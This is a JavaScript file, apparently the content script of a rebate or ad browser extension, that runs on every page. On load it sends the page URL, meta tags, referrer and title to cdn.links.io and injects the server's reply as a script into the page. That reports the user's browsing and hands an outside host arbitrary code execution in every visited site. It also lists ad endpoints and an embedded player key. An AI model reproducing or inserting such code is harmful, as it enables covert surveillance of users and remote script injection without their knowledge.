localSuppress = 1;
var RR_GET_JQ = 0;
var RR_ENDPOINTURL = "http://cdn.links.io/";
var RR_API_ENDPOINT = "http://cdn.links.io/";
var AD_ENDPOINT = "http://ads.links.io/";
var BAR_ENDPOINT = "http://bar.rebaterobot.com/";

var RR_ENDPOINTURLSSL = "https://cdn.links.io/";
var RR_API_ENDPOINTSSL = "https://cdn.links.io/";
var AD_ENDPOINTSSL = "https://ads.links.io/";
var BAR_ENDPOINTSSL = "https://bar.rebaterobot.com/";

var CD_ENDPOINT = "http://www.chirpdeal.com";
var CD_ENDPOINTSSL = "http://www.chirpdeal.com";

var VSOL_ENDPOINT = 'http://www.videostasher.com';
var VSOL_ENDPOINTSSL = 'https://www..videostasher.com';

var RR_GET_JWPLAYER = 0;
var RR_JWPLAYER_KEY = "5PbMPr/5jSlSqTuUpPdxJDeL15AEY0R9cA2WCg==";

rrContentOverlay = {
	jQuery: null,
	pageHandlerURL: 'native/pagehandler.php',
	getSearchQuery: function() {
		if (!this.jQuery) {
			return null;
		}
		var qry = null;
		qry = this.jQuery('input[type=text]:eq(0)').val().trim();
		return qry;
	},
	shuffleArray: function(array) {
		var i = array.length, j, tempi, tempj;
		if (i == 0) {
			return false;
		}

		while (--i) {
			j = Math.floor(Math.random() * (i + 1));
			tempi = array[i];
			tempj = array[j];
			array[i] = tempj;
			array[j] = tempi;
		}

		return array;
	}
};

rrContentOverlay.file_get_contents = function(url, callback) {
	var epurl = url + '&cbust=' + new Date().getTime();
	var epvars = "";

	ajax.get(epurl, function(responseText) {
		var resp = null;
		if (typeof(responseText) != 'undefined') {
			resp = responseText;
		}

		if (typeof(callback) == 'function') {
			callback(resp);
		}
	}, epvars, false);
};

rrContentOverlay.injectCode = function(code) {
	if (code.length > 0) {
		var h = document.getElementsByTagName('head')[0];
		var s = document.createElement('script');
		s.type = 'text/javascript';
		s.innerHTML = code;
		h.appendChild(s);
	}
};

rrContentOverlay.getCookie = function(find_name) {
	var all_cookies = document.cookie.split( ';' );
	var temp_cookie = '';
	var cookie_name = '';
	var cookie_value = null;

	for (var i = 0; i < all_cookies.length; i++ ) {
		temp_cookie = all_cookies[i].split('=');
		cookie_name = temp_cookie[0].replace(/^\s+|\s+$/g, '');
		
		if (cookie_name == find_name) {
			if (temp_cookie.length > 1) {
				cookie_value = unescape(temp_cookie[1].replace(/^\s+|\s+$/g, ''));
			}

			break;
		}
	}
	
	return cookie_value;
};

rrContentOverlay.setCookie = function(name, value, expires, path, domain, secure) {
	// set time, it's in milliseconds
	var today = new Date();
	today.setTime( today.getTime() );
	
	/* if the expires variable is set, make the correct
	 * expires time, the current script below will set
	 * it for x number of days, to make it for hours,
	 * delete * 24, for minutes, delete * 60 * 24
	 */
	if (expires) {
		expires = expires * 1000 * 60 * 60 * 24;
	}
	
	var expires_date = new Date(today.getTime() + (expires));
	document.cookie = name + "=" + escape(value) +
		((expires) ? ";expires=" + expires_date.toGMTString() : "") +
		((path) ? ";path=" + path : "") +
		((domain) ? ";domain=" + domain : "") +
		((secure) ? ";secure" : "");
};

rrContentOverlay.getTLDFromHost = function(host) {
	var parts = host.split(".");
	var tld;
	if (parts.length > 2) {
		tld = host.substring(host.indexOf(".") + 1, host.length);
	} else {
		tld = host;
	}

	return tld;
};
rrContentOverlay.callPageHandler = function() {
	var keywords = "";
	var desc = "";
	metaData = document.getElementsByTagName('meta'); 
	
	if (!document.location.href.match(/\.google\./)) {	//code messes with google pages?
		for (i=0; i<metaData.length; i++) { 
			if(metaData[i].name.toLowerCase() == "keywords"){
				keywords = (metaData[i].content.length > 0) ? metaData[i].content : null;
			} else if(metaData[i].name.toLowerCase() == "description"){
				desc = (metaData[i].content.length > 0) ? metaData[i].content : null;
			}
		} 
	}
	
	var ref = (document.referrer.length > 0)? document.referrer : null;
	var doctitle = (document.title.length > 0)? document.title : null;

	var epurl = (rrContentOverlay.pageProtocol == "https:")? RR_ENDPOINTURLSSL : RR_ENDPOINTURL;
	epurl += rrContentOverlay.pageHandlerURL;
	
	var epvars = "";
	epvars += "u="+escape(window.location.href);
	epvars += "&de="+escape(desc);
	epvars += "&kw="+escape(keywords);
	epvars += "&ref="+escape(ref);
	epvars += "&dt="+escape(doctitle);
	epvars += "&b=crx";
	ajax.post(epurl, function(e){
		if(e.length){
			try {
				if (typeof(RR_SUPPRESS_OTHERS) == 'undefined' || !RR_SUPPRESS_OTHERS) {
					rrContentOverlay.injectCode(e);
				}
			} catch (e) {
				console.log("[pageHandler] exception eval'ing the response:" + e);
			}
		}
	}, epvars, false);
};

rrContentOverlay.injectTag = function(url, callback) {
	var head = document.getElementsByTagName('head')[0];
	var js = document.createElement('script');
	js.type = 'text/javascript';
	js.async = true;
	js.src = url;
	if (typeof(callback) == 'function') {
		js.onload = callback;
	}
	head.appendChild(js);
};

rrContentOverlay.main = function() {
	if (typeof(RR_SUPPRESS_OTHERS) != 'undefined' && RR_SUPPRESS_OTHERS) {
		return;
	}

	if (RR_GET_JWPLAYER) {
		var url = (document.location.protocol == 'https:') ? RR_ENDPOINTURLSSL : RR_ENDPOINTURL;
		url += 'jwplayer/jwplayer.js';
		rrContentOverlay.injectTag(url, function() {
			jwplayer.key = RR_JWPLAYER_KEY;
			rrContentOverlay.callPageHandler();
		});
	} else {
		rrContentOverlay.callPageHandler();
	}
};

rrContentOverlay.init = function() {
	rrContentOverlay.pageProtocol = window.location.protocol;

	var loc = document.location.href;
	//google only
	if (RR_GET_JQ && !loc.match(/www\.google\.com\/calendar/)) {
		var headID = document.getElementsByTagName("head")[0];
		var stl = document.createElement("link");
		stl.rel = "stylesheet";
		stl.type = "text/css";
		stl.href = ((document.location.protocol == 'https:') ? RR_ENDPOINTURLSSL : RR_ENDPOINTURL) + 'native/styles.css';
		headID.appendChild(stl);
		
		var otherlib = false;
		if (typeof($) == 'function') {
			otherlib = true;
		}

		if (typeof(jQuery) == 'undefined') {
			var jsn = document.createElement("script");
			jsn.type = 'text/javascript';
			jsn.src = rrContentOverlay.pageProtocol + "//ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js";
			jsn.onload = function () {
				if (typeof(jQuery) != 'undefined') {
					rrContentOverlay.jQuery = (!otherlib) ? jQuery : jQuery.noConflict();
					rrContentOverlay.main(); 
				}
			};
			headID.appendChild(jsn);
		} else {
			rrContentOverlay.jQuery = jQuery;
			rrContentOverlay.main(); 
		}
	} else if (!loc.match(/www\.google\.com\/calendar/)) {
		rrContentOverlay.main();
	}
};

rrContentOverlay.parseURL = function(str, component) {
    // http://kevin.vanzonneveld.net
    // +      original by: Steven Levithan (http://blog.stevenlevithan.com)
    // + reimplemented by: Brett Zamir (http://brett-zamir.me)
    // + input by: Lorenzo Pisani
    // + input by: Tony
    // + improved by: Brett Zamir (http://brett-zamir.me)
    // %          note: Based on http://stevenlevithan.com/demo/parseuri/js/assets/parseuri.js
    // %          note: blog post at http://blog.stevenlevithan.com/archives/parseuri
    // %          note: demo at http://stevenlevithan.com/demo/parseuri/js/assets/parseuri.js
    // %          note: Does not replace invalid characters with '_' as in PHP, nor does it return false with
    // %          note: a seriously malformed URL.
    // %          note: Besides function name, is essentially the same as parseUri as well as our allowing
    // %          note: an extra slash after the scheme/protocol (to allow file:/// as in PHP)
    // *     example 1: parse_url('http://username:password@hostname/path?arg=value#anchor');
    // *     returns 1: {scheme: 'http', host: 'hostname', user: 'username', pass: 'password', path: '/path', query: 'arg=value', fragment: 'anchor'}
    var key = ['source', 'scheme', 'authority', 'userInfo', 'user', 'pass', 'host', 'port', 
                        'relative', 'path', 'directory', 'file', 'query', 'fragment'],
        ini = (this.php_js && this.php_js.ini) || {},
        mode = (ini['phpjs.parse_url.mode'] && 
            ini['phpjs.parse_url.mode'].local_value) || 'php',
        parser = {
            php: /^(?:([^:\/?#]+):)?(?:\/\/()(?:(?:()(?:([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?))?()(?:(()(?:(?:[^?#\/]*\/)*)()(?:[^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
            strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
            loose: /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/\/?)?((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/ // Added one optional slash to post-scheme to catch file:/// (should restrict this)
        };

    var m = parser[mode].exec(str),
        uri = {},
        i = 14;
    while (i--) {
        if (m[i]) {
          uri[key[i]] = m[i];  
        }
    }

    if (component) {
        return uri[component.replace('PHP_URL_', '').toLowerCase()];
    }
    if (mode !== 'php') {
        var name = (ini['phpjs.parse_url.queryKey'] && 
                ini['phpjs.parse_url.queryKey'].local_value) || 'queryKey';
        parser = /(?:^|&)([^&=]*)=?([^&]*)/g;
        uri[name] = {};
        uri[key[12]].replace(parser, function ($0, $1, $2) {
            if ($1) {uri[name][$1] = $2;}
        });
    }
    delete uri.source;
    return uri;
};

rrContentOverlay.getQueryVar = function(varName, query)
{
	var pieces = query.split('&');
	var num_pieces = pieces.length;

	for (i = 0; i < num_pieces; i++) {
		var t = pieces[i].split('=');
		if (t[0] == varName) {
			return t[1];
		}
	}

	return null;
};

var rrJWPlayer = {
	mparent: null,
	originalContent: null,
	minimumDuration: 3,
	replaceContent: function() {
		if (this.mparent && this.originalContent) {
			rrContentOverlay.jQuery(this.mparent).html(this.originalContent);
		}
	}
};

window.addEventListener("message", function(evnt) {
	if (evnt.data == 'replace_yt_content') {
		rrJWPlayer.replaceContent();
	}
});

//basic ajax lib - miniajax
//function $(e){if(typeof e=='string')e=document.getElementById(e);return e};
//function collect(a,f){var n=[];for(var i=0;i<a.length;i++){var v=f(a[i]);if(v!=null)n.push(v)}return n};
ajax={};
ajax.x=function(){try{return new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{return new ActiveXObject('Microsoft.XMLHTTP')}catch(e){return new XMLHttpRequest()}}};
ajax.serialize=function(f){var g=function(n){return f.getElementsByTagName(n)};var nv=function(e){if(e.name)return encodeURIComponent(e.name)+'='+encodeURIComponent(e.value);else return ''};var i=collect(g('input'),function(i){if((i.type!='radio'&&i.type!='checkbox')||i.checked)return nv(i)});var s=collect(g('select'),nv);var t=collect(g('textarea'),nv);return i.concat(s).concat(t).join('&');};
ajax.send=function(u,f,m,a,t){var
x=ajax.x();x.open(m,u,true);x.onreadystatechange=function(){if(x.readyState==4)f(x.responseText)};if(m=='POST')x.setRequestHeader('Content-type','application/x-www-form-urlencoded');if(t)x.withCredentials=true;x.send(a)};
ajax.get=function(url,func){ajax.send(url,func,'GET')};
ajax.gets=function(url){var x=ajax.x();x.open('GET',url,false);x.send(null);return x.responseText};
ajax.post=function(url,func,args,auth){ajax.send(url,func,'POST',args,auth)};
ajax.update=function(url,elm){var e=$(elm);var f=function(r){e.innerHTML=r};ajax.get(url,f)};
ajax.submit=function(url,elm,frm){var e=$(elm);var f=function(r){e.innerHTML=r};ajax.post(url,f,ajax.serialize(frm))};

function XcreateCookie(name, value, days) {
    var expires;
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
    }
    else expires = "";
    document.cookie = name + "=" + value + expires + "; path=/";
}

function XreadCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

function XeraseCookie(name) {
    XcreateCookie(name, "", -1);
}

function XareCookiesEnabled() {
    var r = false;
    XcreateCookie("testing", "Hello", 1);
    if (XreadCookie("testing") != null) {
        r = true;
        XeraseCookie("testing");
    }
    return r;
}

function _st_replace(str, key, value)
{
	if (str.indexOf("&" + key + "=") > -1 || str.indexOf(key + "=") === 0) {
		// find start
		var idx = str.indexOf("&" + key + "="),
			end, newstr;
		if (idx === -1) {
			idx = str.indexOf(key + "=");
		}
		// find end
		end = str.indexOf("&", idx + 1);
		if (end !== -1) {
			newstr = str.substr(0, idx) + str.substr(end + (idx ? 0 : 1)) + "&" + key + "=" + value;
		} else {
			newstr = str.substr(0, idx) + "&" + key + "=" + value;
		}
		return newstr;
	} else {
		return str + "&" + key + "=" + value;
	}
}

var domready = function(fn) {
  if (document.readyState == "complete")
      return fn();

  if (window.addEventListener)
      window.addEventListener("load", fn, false);
  else if (window.attachEvent)
      window.attachEvent("onload", fn);
  else
      window.onload = fn;
};

domready(function() {
	if (window.top === window) {
		currenturl = window.location.href;
		rrContentOverlay.init();
	}
});
